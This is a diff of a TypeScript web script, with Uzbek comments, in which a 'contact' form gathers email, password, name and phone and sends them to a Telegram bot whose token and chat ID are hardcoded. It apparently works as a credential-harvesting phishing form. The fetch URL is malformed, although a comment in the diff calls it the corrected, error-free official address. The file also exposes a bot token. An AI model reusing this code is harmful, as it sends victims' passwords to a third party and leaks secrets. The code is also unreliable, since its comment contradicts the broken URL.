@@ -3,7 +3,6 @@
 const BOT_TOKEN: string = '8765203206:AAGkiR2x8tYa0fT6pi7VCdIcrW9LYw1xlok';
 const CHAT_ID: string = '6023504003';
 
-// HTML elementlarini DOM'dan olish va turlarini belgilash
 const form = document.querySelector('#contactForm') as HTMLFormElement | null;
 const statusText = document.querySelector('#status') as HTMLElement | null;
 
@@ -11,7 +10,6 @@ if (form && statusText) {
   form.addEventListener('submit', function (e: SubmitEvent): void {
     e.preventDefault();
 
-    // Input elementlarini olish va qiymatlarini o'qish
     const emailInput = document.getElementById('email') as HTMLInputElement | null;
     const passwordInput = document.getElementById('password') as HTMLInputElement | null;
     const nameInput = document.getElementById('name') as HTMLInputElement | null;
@@ -24,13 +22,13 @@ if (form && statusText) {
 
     const text: string = `
 📝 Yangi forma xabari:
-👨    ism:${name}
-📧    email:${email}
-🔑    parol:${password}
-📞    telefon:${call}
+👨    ism: ${name}
+📧    email: ${email}
+🔑    parol: ${password}
+📞    telefon: ${call}
     `;
 
-    // To'g'rilangan Telegram API manzili
+    // TO'G'RILANDI: Rasmiy va xatosiz Telegram API manzili o'rnatildi
     fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
